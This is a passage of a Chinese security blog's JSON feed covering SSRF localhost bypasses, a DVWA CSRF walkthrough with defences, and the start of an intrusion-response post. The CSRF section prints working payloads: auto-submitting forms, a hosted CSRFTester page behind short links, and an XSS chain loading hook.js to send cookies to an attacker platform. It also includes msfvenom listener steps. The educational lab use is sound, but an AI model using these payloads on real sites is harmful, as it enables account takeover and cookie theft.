127.0.0.1 过滤</p>\n<p>1. 变形</p>\n<p>http://[::1]<br>\nhttp://[::ffff:7f00:1]<br>\nhttp://[::ffff:127.0.0.1]<br>\n<span class=\"exturl\" data-url=\"aHR0cDovLzEyNy4x\">http://127.1</span><br>\n<span class=\"exturl\" data-url=\"aHR0cDovLzEyNy4wLjE=\">http://127.0.1</span><br>\n<span class=\"exturl\" data-url=\"aHR0cDovLzA6ODA=\">http://0:80</span></p>\n<p>2.ip 进制转换</p>\n<p>转为 16 进制，或 10 进制，8 进制</p>\n<p>3.16 进制网址编码</p>\n<p>4.30x 重定向</p>\n<p>防御</p>\n<p>・禁止 302 跳转，或者每跳转一次都进行校验目的地址是否为内网地址或合法地址。</p>\n<p>CURLOPT_FOLLOWLOCATION</p>\n<p>・过滤返回信息，验证远程服务器对请求的返回结果，是否合法。</p>\n<p>・禁用高危协议，例如：gopher、dict、ftp、file 等，只允许 http/https</p>\n<p>・设置 URL 白名单或者限制内网 IP</p>\n<p>・限制请求的端口为 http 的常用端口，或者根据业务需要治开放远程调用服务的端口</p>\n<p>・catch 错误信息，做统一错误信息，避免黑客通过错误信息判断端口对应的服务</p>\n",
            "tags": []
        },
        {
            "id": "http://example.com/2022/05/27/CSRF/",
            "url": "http://example.com/2022/05/27/CSRF/",
            "title": "CSRF",
            "date_published": "2022-05-27T05:38:45.000Z",
            "content_html": "<h1 id=\"csrf\"><a class=\"markdownIt-Anchor\" href=\"#csrf\">#</a> CSRF</h1>\n<p><strong>引用自 pikachu 的解释：</strong></p>\n<blockquote>\n<p>CSRF (跨站请求伪造) 概述</p>\n<p>Cross-site request forgery 简称为 “CSRF”，在 CSRF 的攻击场景中攻击者会伪造一个请求（这个请求一般是一个链接），然后欺骗目标用户进行点击，用户一旦点击了这个请求，整个攻击就完成了。所以 CSRF 攻击也成为 &quot;one click&quot; 攻击。 很多人搞不清楚 CSRF 的概念，甚至有时候会将其和 XSS 混淆，更有甚者会将其和越权问题混为一谈，这都是对原理没搞清楚导致的。<br>\n这里列举一个场景解释一下，希望能够帮助你理解。<br>\n<strong>场景需求：</strong><br>\n小黑想要修改大白在购物网站 tianxiewww.xx.com 上填写的会员地址。<br>\n<strong>先看下大白是如何修改自己的密码的：</strong><br>\n登录 — 修改会员信息，提交请求 — 修改成功。<br>\n所以小黑想要修改大白的信息，他需要拥有：1，登录权限 2，修改个人信息的请求。</p>\n<p>但是大白又不会把自己 xxx 网站的账号密码告诉小黑，那小黑怎么办？<br>\n于是他自己跑到 www.xx.com 上注册了一个自己的账号，然后修改了一下自己的个人信息（比如：E-mail 地址），他发现修改的请求是：<br>\n【<span class=\"exturl\" data-url=\"aHR0cDovL3d3dy54eHguY29tL2VkaXQucGhwP2VtYWlsPXhpYW9oZWlAODguY29tJmFtcDtDaGFuZ2U9Q2hhbmdlJUUzJTgwJTkx\">http://www.xxx.com/edit.php?email=xiaohei@88.com&amp;Change=Change】</span><br>\n于是，他实施了这样一个操作：把这个链接伪装一下，在小白登录 xxx 网站后，欺骗他进行点击，小白点击这个链接后，个人信息就被修改了，小黑就完成了攻击目的。</p>\n<p><strong>为啥小黑的操作能够实现呢。有如下几个关键点：</strong><br>\n1.www.xxx.com 这个网站在用户修改个人的信息时没有过多的校验，导致这个请求容易被伪造；<br>\n— 因此，我们判断一个网站是否存在 CSRF 漏洞，其实就是判断其对关键信息（比如密码等敏感信息）的操作 (增删改) 是否容易被伪造。<br>\n2. 小白点击了小黑发给的链接，并且这个时候小白刚好登录在购物网上；<br>\n— 如果小白安全意识高，不点击不明链接，则攻击不会成功，又或者即使小白点击了链接，但小白此时并没有登录购物网站，也不会成功。<br>\n— 因此，要成功实施一次 CSRF 攻击，需要 “天时，地利，人和” 的条件。<br>\n当然，如果小黑事先在 xxx 网的首页如果发现了一个 XSS 漏洞，则小黑可能会这样做： 欺骗小白访问埋伏了 XSS 脚本（盗取 cookie 的脚本）的页面，小白中招，小黑拿到小白的 cookie，然后小黑顺利登录到小白的后台，小黑自己修改小白的相关信息。<br>\n— 所以跟上面比一下，就可以看出 CSRF 与 XSS 的区别：CSRF 是借用户的权限完成攻击，攻击者并没有拿到用户的权限，而 XSS 是直接盗取到了用户的权限，然后实施破坏。</p>\n<p>因此，网站如果要防止 CSRF 攻击，则需要对敏感信息的操作实施对应的安全措施，防止这些操作出现被伪造的情况，从而导致 CSRF。比如：<br>\n–对敏感信息的操作增加安全的 token；<br>\n–对敏感信息的操作增加安全的验证码；<br>\n–对敏感信息的操作实施安全的逻辑流程，比如修改密码时，需要先校验旧密码等。</p>\n</blockquote>\n<p>CSRF 攻击利用网站对于用户网页浏览器的信任，挟持用户当前已登陆的 Web 应用程序，去执行并非用户本意的操作。</p>\n<p>没有对用户合法身份进行验证</p>\n<h2 id=\"csrf类型\"><a class=\"markdownIt-Anchor\" href=\"#csrf类型\">#</a> CSRF 类型</h2>\n<p><strong>GET 类型的 CSRF</strong></p>\n<p>GET 类型的 CSRF 利用非常简单，只需要一个 HTTP 请求，一般会这样利用：</p>\n<p><code>http://1.1.1.1:18888/dvwa/vulnerabilities/csrf/?password_new=aaaaaa&amp;password_conf=aaaaaa&amp;Change=Change#</code></p>\n<p>在受害者访问这个页面后，浏览器会自动向 <code>http://1.1.1.1:18888/dvwa/vulnerabilities/csrf/?password_new=aaaaaa&amp;password_conf=aaaaaa&amp;Change=Change#</code> 发出一次 HTTP 请求。1.1.1.1:18888 就会受到用户修改密码的跨域请求，同时因为用户在 A 页面没有登出，浏览器会携带 A 的 cookie</p>\n<p><strong>POST 类型的 CSRF</strong></p>\n<p>这种类型的 CSRF 利用起来通常使用的是一个自动提交的表单，如：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> <span class=\"tag\">&lt;<span class=\"name\">form</span> <span class=\"attr\">action</span>=<span class=\"string\">&quot;http://bank.example/withdraw&quot;</span> <span class=\"attr\">method</span>=<span class=\"string\">POST</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;hidden&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;account&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;xiaoming&quot;</span> /&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;hidden&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;amount&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;10000&quot;</span> /&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;hidden&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;for&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;hacker&quot;</span> /&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">form</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"language-javascript\"> <span class=\"variable language_\">document</span>.<span class=\"property\">forms</span>[<span class=\"number\">0</span>].<span class=\"title function_\">submit</span>(); </span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span> </span><br></pre></td></tr></table></figure>\n<p>访问该页面后，表单会自动提交，相当于模拟用户完成了一次 POST 操作。</p>\n<p><strong>链接类型的 CSRF</strong></p>\n<p>链接类型的 CSRF 并不常见，比起其他两种用户打开页面就中招的情况，这种需要用户点击链接才会触发。这种类型通常是在论坛中发布的图片中嵌入恶意链接，或者以广告的形式诱导用户中招，攻击者通常会以比较夸张的词语诱骗用户点击，例如：</p>\n<p><code> &lt;a href=&quot;http://test.com/csrf/withdraw.php?amount=1000&amp;for=hacker&quot; taget=&quot;_blank&quot;&gt;   重磅消息！！   &lt;a/&gt;</code></p>\n<h2 id=\"dvwa\"><a class=\"markdownIt-Anchor\" href=\"#dvwa\">#</a> dvwa</h2>\n<p>1.low</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221029213100094.png\" alt=\"image-20221029213100094\"></p>\n<p>由于我当前已经登录，因此网站中是存在我的 cookie 滴</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221029213206492.png\" alt=\"image-20221029213206492\"></p>\n<p>并且在 low 模式下，没有原密码做验证，也没有 token 对用户身份最校验，那么 csrf 就出现了</p>\n<p>我目前修改自己的密码，从 password 修改为 123456，观察 URL 的变化</p>\n<p><code>http://127.0.0.1:18888/dvwa/vulnerabilities/csrf/?password_new=123456&amp;password_conf=123456&amp;Change=Change#</code></p>\n<p>网络中有个 hacker，抓到了我修改密码的请求包，意味着他也得到了上述 url，那么他就可以构造以下 url：</p>\n<p><code>http://127.0.0.1:18888/dvwa/vulnerabilities/csrf/?password_new=aaaaaa&amp;password_conf=aaaaaa&amp;Change=Change#</code></p>\n<p>然后把它缩短为短链接的形式：</p>\n<p><code>http://gg.gg/12iqj8</code></p>\n<p>我一旦点击后，就会向服务器发送 change password 的请求</p>\n<p>此时我的密码就会被改变</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221029213847558.png\" alt=\"image-20221029213847558\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221029213921662.png\" alt=\"image-20221029213921662\"></p>\n<p>2.medium</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">    if( isset( $_GET[ ‘Change’ ] ) ) &#123;</span><br><span class=\"line\">    // Checks to see where the request came from</span><br><span class=\"line\">    if( eregi( $_SERVER[ ‘SERVER_NAME’ ], $_SERVER[ ‘HTTP_REFERER’ ] ) ) &#123;</span><br><span class=\"line\">    // Get input</span><br><span class=\"line\">    $pass_new = $_GET[ ‘password_new’ ];</span><br><span class=\"line\">    $pass_conf = $_GET[ ‘password_conf’ ];</span><br></pre></td></tr></table></figure>\n<p>多了判断 HTTP_REFERER 中是否有 SERVER_NAME，HTTP_REFERER 是 Referer 参数值，即来源地址，SERVER_NAME 是 host 参数及主机 ip 名</p>\n<p>其实他是想限制同源，但可以绕过</p>\n<p>同时使用 csrftester 生成 payload，但不一样的是需要修改文件名为 IP.html，比如 192.168.13.133.html，这样在检测 refer 时就会包括了我们的 hostIP，相当于</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">HOST: 192.168.13.133</span><br><span class=\"line\">Referer: http://101.1.1.1/dvwa/192.168.13.133.html</span><br></pre></td></tr></table></figure>\n<p>3.high</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if ($change) &#123;</span><br><span class=\"line\">\t// Check Anti-CSRF token</span><br><span class=\"line\">\tcheckToken( $token, $_SESSION[ &#x27;session_token&#x27; ], &#x27;index.php&#x27; );</span><br><span class=\"line\"></span><br><span class=\"line\">\t// Do the passwords match?</span><br><span class=\"line\">\tif( $pass_new == $pass_conf ) &#123;</span><br><span class=\"line\">\t\t// They do!</span><br><span class=\"line\">\t\t$pass_new = mysqli_real_escape_string ($GLOBALS[&quot;___mysqli_ston&quot;], $pass_new);</span><br><span class=\"line\">\t\t$pass_new = md5( $pass_new );</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t// Update the database</span><br><span class=\"line\">\t\t$insert = &quot;UPDATE `users` SET password = &#x27;&quot; . $pass_new . &quot;&#x27; WHERE user = &#x27;&quot; . dvwaCurrentUser() . &quot;&#x27;;&quot;;</span><br><span class=\"line\">\t\t$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert );</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t// Feedback for the user</span><br><span class=\"line\">\t\t$return_message = &quot;Password Changed.&quot;;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\telse &#123;</span><br><span class=\"line\">\t\t// Issue with passwords matching</span><br><span class=\"line\">\t\t$return_message = &quot;Passwords did not match.&quot;;</span><br><span class=\"line\">\t&#125;</span><br></pre></td></tr></table></figure>\n<p>攻击思路是试着去构造一个攻击页面，将其放置在攻击者的服务器，引诱受害者访问，从而获得 token 值，并向服务器发送改密请求，完成攻击。<br>\n但是，浏览器并不允许跨域请求，因此，我们可以利用 xss 漏洞</p>\n<p>我们需要利用 xss 了，打开 stroed xss，构造如下代码 <code>&lt;iframe src=&quot;../csrf/&quot;onload=alert(document.getElementsByName('user_token')[0].value)&gt;&lt;/iframe&gt;</code>  获得 cookie，使用 cookie 完成 csrf</p>\n<p>或者使用 CSRF Token Tracker 的 BP 插件</p>\n<h2 id=\"csrf-tester\"><a class=\"markdownIt-Anchor\" href=\"#csrf-tester\">#</a> CSRF tester</h2>\n<blockquote>\n<p>CSRFTester 是一款 CSRF 漏洞的测试工具，CSRFTester 工具的测试原理大概是这样的，使用代理抓取我们在浏览器中访问过的所有的连接以及所有的表单等信息，通过在 CSRFTester 中修改相应的表单等信息，重新提交，相当于一次伪造客户端请求，如果修改后的测试请求成功被网站服务器接受，则说明存在 CSRF 漏洞，当然此款工具也可以被用来进行 CSRF 攻击。</p>\n</blockquote>\n<p>CSRF tester 监听 8008 端口，注意设置代理～</p>\n<p><code>10月 29, 2022 9:42:36 下午 org.owasp.webscarab.plugin.proxy.Listener listen 信息: Proxy listening on 127.0.0.1:8008</code></p>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221029214412139.png\" alt=\"image-20221029214412139\" style=\"zoom: 67%;\" />\n<p>接着访问可能存在 csrf 的连接～</p>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221029214511815.png\" alt=\"image-20221029214511815\" style=\"zoom:80%;\" />\n<p>点击 start recording</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221029214544955.png\" alt=\"image-20221029214544955\"></p>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221029215312102.png\" alt=\"image-20221029215312102\" style=\"zoom:80%;\" />\n<p>将左侧的参数修改为自己的</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221030095527035.png\" alt=\"image-20221030095527035\"></p>\n<p>生成 html</p>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221029215514582.png\" alt=\"image-20221029215514582\" style=\"zoom:80%;\" />\n<p>生成的 payload 如下：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"keyword\">HTML</span> <span class=\"keyword\">PUBLIC</span> <span class=\"string\">&quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot;</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>OWASP CRSFTester Demonstration<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span> <span class=\"attr\">onload</span>=<span class=\"string\">&quot;javascript:fireForms()&quot;</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">language</span>=<span class=\"string\">&quot;JavaScript&quot;</span>&gt;</span><span class=\"language-javascript\"></span></span><br><span class=\"line\"><span class=\"language-javascript\"><span class=\"keyword\">var</span> pauses = <span class=\"keyword\">new</span> <span class=\"title class_\">Array</span>( <span class=\"string\">&quot;53&quot;</span> );</span></span><br><span class=\"line\"><span class=\"language-javascript\"></span></span><br><span class=\"line\"><span class=\"language-javascript\"><span class=\"keyword\">function</span> <span class=\"title function_\">pausecomp</span>(<span class=\"params\">millis</span>)</span></span><br><span class=\"line\"><span class=\"language-javascript\">&#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">    <span class=\"keyword\">var</span> date = <span class=\"keyword\">new</span> <span class=\"title class_\">Date</span>();</span></span><br><span class=\"line\"><span class=\"language-javascript\">    <span class=\"keyword\">var</span> curDate = <span class=\"literal\">null</span>;</span></span><br><span class=\"line\"><span class=\"language-javascript\"></span></span><br><span class=\"line\"><span class=\"language-javascript\">    <span class=\"keyword\">do</span> &#123; curDate = <span class=\"keyword\">new</span> <span class=\"title class_\">Date</span>(); &#125;</span></span><br><span class=\"line\"><span class=\"language-javascript\">    <span class=\"keyword\">while</span>(curDate-date &lt; millis);</span></span><br><span class=\"line\"><span class=\"language-javascript\">&#125;</span></span><br><span class=\"line\"><span class=\"language-javascript\"></span></span><br><span class=\"line\"><span class=\"language-javascript\"><span class=\"keyword\">function</span> <span class=\"title function_\">fireForms</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"language-javascript\">&#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">    <span class=\"keyword\">var</span> count = <span class=\"number\">1</span>;</span></span><br><span class=\"line\"><span class=\"language-javascript\">    <span class=\"keyword\">var</span> i=<span class=\"number\">0</span>;</span></span><br><span class=\"line\"><span class=\"language-javascript\">    </span></span><br><span class=\"line\"><span class=\"language-javascript\">    <span class=\"keyword\">for</span>(i=<span class=\"number\">0</span>; i&lt;count; i++)</span></span><br><span class=\"line\"><span class=\"language-javascript\">    &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">        <span class=\"variable language_\">document</span>.<span class=\"property\">forms</span>[i].<span class=\"title function_\">submit</span>();</span></span><br><span class=\"line\"><span class=\"language-javascript\">        </span></span><br><span class=\"line\"><span class=\"language-javascript\">        <span class=\"title function_\">pausecomp</span>(pauses[i]);</span></span><br><span class=\"line\"><span class=\"language-javascript\">    &#125;</span></span><br><span class=\"line\"><span class=\"language-javascript\">&#125;</span></span><br><span class=\"line\"><span class=\"language-javascript\">    </span></span><br><span class=\"line\"><span class=\"language-javascript\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">H2</span>&gt;</span>OWASP CRSFTester Demonstration<span class=\"tag\">&lt;/<span class=\"name\">H2</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">form</span> <span class=\"attr\">method</span>=<span class=\"string\">&quot;GET&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;form0&quot;</span> <span class=\"attr\">action</span>=<span class=\"string\">&quot;http://10.128.50.84:18888/dvwa/vulnerabilities/csrf/?password_new=password&amp;password_conf=password&amp;Change=Change&quot;</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;hidden&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;name&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;value&quot;</span>/&gt;</span> </span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">form</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>将它放在我的服务器上： <code>(http://101.35.139.208:9999/shabi233.html)</code></p>\n<p>再以同样的方式生成短链接： <code>http://gg.gg/12ivbn</code></p>\n<p>访问后密码就会被修改</p>\n<h2 id=\"csrf-防御\"><a class=\"markdownIt-Anchor\" href=\"#csrf-防御\">#</a> CSRF 防御</h2>\n<p>1. 在请求地址中添加 token 验证</p>\n<input type=\"hidden\" name=\"token\" value=\"\">\n<p>可以在 HTTP 请求中以参数的形式加入一个随机产生的 token，可以在用户登录后放入 session 中，并在服务器端建立一个拦截器来验证这个 token，如果请求中没有 token 或者 token 内容不正确，则认为可能是 CSRF 攻击而拒绝该请求。</p>\n<p>2. 添加 referer 认证</p>\n<p>如果是以网站 WebA 的网址开头的域名，则说明该请求是来自 WebA 自己的请求，是合法的。</p>\n<p>但 referer 可以伪造</p>\n<p>3. 限制跨域</p>\n<p>阻止不明外域的访问，使用 json api</p>\n<p>使用 JavaScript 发起 AJAX 请求是限制跨域的，并不能通过简单的表单来发送 JSON，所以，通过只接收 JSON 可以很大可能避免 CSRF 攻击。</p>\n<ul>\n<li>同源检测</li>\n<li>Samesite Cookie</li>\n</ul>\n<p>4. 修改密码时需要原密码</p>\n<h2 id=\"xss-csrf\"><a class=\"markdownIt-Anchor\" href=\"#xss-csrf\">#</a> xss + csrf</h2>\n<p>selfxss 就是只能对本地客户端产生影响的跨站脚本攻击，举例简单来说就是像获取到的 cookie 是自己的，显然这并没有什么实际危害，但是一旦结合跨站请求伪造则会导致危害升级，并且成为存储型的跨站脚本攻击。</p>\n<h4 id=\"stored-xss-csrf\"><a class=\"markdownIt-Anchor\" href=\"#stored-xss-csrf\">#</a> stored xss + csrf</h4>\n<p>即同时存在 xss 和 csrf 的地方</p>\n<p>思路是：在 xss 中插入我们构造的 csrf 的恶意代码的连接，一旦用户访问，我们就可以跳转到 csrf 页面干一些见不得人的事</p>\n<p>1. 使用前面提到过的 csrftester 生成一个 payload，放在自己的服务器上，比如我的服务器为 1.1.1.1，生成的 payload 名字是 haha.html，放在网站根目录下，那么此时完整路径为 <code>1.1.1.1/haha.html</code></p>\n<p>2. 在 stroed xss 处插入： <code>&lt;script src=&quot;x&quot; onerror=javascript:window.open(&quot;http://1.1.1.1/haha.html&quot;)&gt;&lt;/script&gt;</code></p>\n<p>3. 用户一旦访问，我们 haha.html 中的 csrf 恶意代码就会被执行</p>\n<h4 id=\"self-xss-csrf\"><a class=\"markdownIt-Anchor\" href=\"#self-xss-csrf\">#</a> self-xss + csrf</h4>\n<p>selfxss 一般只能获取自己的 cookie，但结合 csrf，我们可以获取别人的 cookie。我们在 input 中提交的是 hook.js，用户一旦点击，相当于让别人触发这个 js，cookie 被外带到平台，而 selfxss 则是自己触发 js</p>\n<p>1. 首先准备一个 xss 平台，使用它他提供的 payload： <code>&lt;script src=&quot;http://192.168.38.129:3000/hook.js&quot;&gt;&lt;/script&gt;</code></p>\n<p>2. 使用 csrftester 生成我们的 payload，payload 路径和名称参考前一个 <code>1.1.1.1/haha.html</code> ，但此时 payload 需要做一些修改</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;form method=&quot;GET&quot; name=&quot;form0&quot; action=&quot;http://192.168.38.132:80/dvwa/vulnerabilities/xss_r/?name=&lt;script src=&#x27;http://192.168.38.129:3000/hook.js&#x27;&gt;&lt;/script&gt;&quot;&gt;</span><br><span class=\"line\">&lt;input type=&quot;hidden&quot; name=&quot;name&quot; value=&quot;&lt;script src=&#x27;http://192.168.38.129:3000/hook.js&#x27;&gt;&lt;/script&gt;&quot;/&gt; </span><br></pre></td></tr></table></figure>\n<p>3. 用户登录账户，点击我们的链接，我们就能在 xss 平台看到他的 cookie 了</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly90ZWNoLm1laXR1YW4uY29tLzIwMTgvMTAvMTEvZmUtc2VjdXJpdHktY3NyZi5odG1s\">前端安全系列（二）：如何防止 CSRF 攻击？ - 美团技术团队 (meituan.com)</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vYXJ0aWNsZXMvd2ViLzE2NDA2OS5odG1s\">鸡肋 CSRF 和 Self-XSS 组合的变废为宝 - FreeBuf 网络安全行业门户</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vYXJ0aWNsZXMvd2ViLzM0MTU5MS5odG1s\">CSRF 入门及靶场实战 - FreeBuf 网络安全行业门户</span></p>\n",
            "tags": []
        },
        {
            "id": "http://example.com/2022/05/27/emergency%20response/",
            "url": "http://example.com/2022/05/27/emergency%20response/",
            "title": "应急响应",
            "date_published": "2022-05-27T05:38:45.000Z",
            "content_html": "<h1 id=\"emergency-response\"><a class=\"markdownIt-Anchor\" href=\"#emergency-response\">#</a> emergency response</h1>\n<h2 id=\"入侵排查\"><a class=\"markdownIt-Anchor\" href=\"#入侵排查\">#</a> 入侵排查</h2>\n<h3 id=\"windows\"><a class=\"markdownIt-Anchor\" href=\"#windows\">#</a> Windows</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.生成msf木马</span><br><span class=\"line\">msfvenom -p LHOST LPORT -f</span><br><span class=\"line\"></span><br><span class=\"line\">2.监听</span><br><span class=\"line\">use exploit/multi/handler</span><br><span class=\"line\">set payload </span><br><span class=\"line\">set lohost</span><br><span class=\"line\">set lport</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>msf 中可以在网络链接中找到，但任务管理器找不到</p>\n</blockquote>\n<h4 id=\"端口\"><a class=\"markdownIt-Anchor\" href=\"#端口\">#</a> 端口</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">C:\\Users\\18310&gt;netstat -ano | findstr &quot;ESTABLISH&quot;</span><br><span class=\"line\">  TCP    10.128.50.84:49893     42.81.179.166:80       ESTABLISHED     25756</span><br><span class=\"line\">  TCP    10.128.50.84:49898     42.81.193.250:443      ESTABLISHED     25756</span><br><span class=\"line\">  TCP    10.128.50.84:49919     103.212.12.39:3000     ESTABLISHED     2208</span><br><span class=\"line\">  TCP    10.128.50.84:57229     119.3.227.186:11113    ESTABLISHED     35024</span><br><span class=\"line\">  TCP    10.128.50.84:57357     113.142.50.195:443     ESTABLISHED     32808</span><br><span class=\"line\">  TCP    10.128.50.84:57413     119.38.189.36:3504     ESTABLISHED     32808</span><br><span class=\"line\">  TCP    10.128.50.84:57462     117.62.242.202:80      ESTABLISHED     25756</span><br><span class=\"line\">  TCP    10.128.50.84:57464     120.133.59.142:443     ESTABLISHED     6056</span><br><span class=\"line\">  TCP    10.128.50.84:57474     120.133.59.142:443     ESTABLISHED     6484</span><br><span class=\"line\">  TCP    10.128.50.84:57483     